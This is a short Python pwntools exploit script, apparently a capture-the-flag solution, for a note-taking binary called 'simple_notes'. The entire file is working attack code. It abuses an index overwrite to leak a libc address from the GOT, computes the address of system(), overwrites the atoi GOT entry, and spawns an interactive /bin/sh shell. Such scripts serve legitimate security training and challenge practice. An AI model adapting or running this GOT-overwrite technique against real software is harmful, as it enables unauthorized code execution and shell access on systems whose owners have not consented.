#!/usr/bin/python3
from pwn import *

NAME = "simple_notes"
if True:
    # Change the host and port accordingly
    p = remote("127.0.0.1", 9999)
else:
    p = process(f"./{NAME}")
binary = ELF(f"./{NAME}")
libc = ELF("./libc.so.6")

def create_note(data, importance=1):
    p.recvuntil(b"> ")
    p.sendline(b"1")
    p.sendline(str(importance).encode())
    p.sendline(str(len(data)).encode())
    p.send(data)

def read_note(index):
    p.recvuntil(b"> ")
    p.sendline(b"3")
    p.sendline(str(index).encode())
    p.recvline()
    return int(p.recvline().decode().rstrip("\n").split()[1])


def edit_note(index, data, importance=1):
    p.recvuntil(b"> ")
    p.sendline(b"4")
    p.sendline(str(index).encode())
    p.sendline(str(importance).encode())
    p.sendline(str(len(data)).encode())
    p.send(data)

# Fill up the note array
for _ in range(256):
    create_note(b"/bin/sh" + (b" " * 10))

# Overwrite the index value
create_note(b"a"*10, -3)

# Find suitable function to leak
func = offset = None
for el in binary.got:
    if not el.startswith("__"):
        if (binary.got[el] - binary.sym["notebook"]) % 8 == 0:
            func = el
            offset = (binary.got[el] - binary.sym["notebook"]) // 8

# Read libc address
libc_func = read_note(offset)
print(f"[*] function {func} is at {hex(libc_func)}")
libc_base = libc_func - libc.sym[func]
print(f"[*] libc base is at {hex(libc_base)}")
libc_system = libc_base + libc.sym["system"]
print(f"[*] system is at {hex(libc_system)}")

# Overwrite atoi GOT entry and trigger the bug
target = (binary.got["atoi"] - binary.sym["notebook"]) // 8
# Edit note
p.sendline(b"4")
p.sendline(str(target).encode())
p.sendline(str(libc_system - (1<<32)).encode())
p.sendline("/bin/sh")

p.interactive()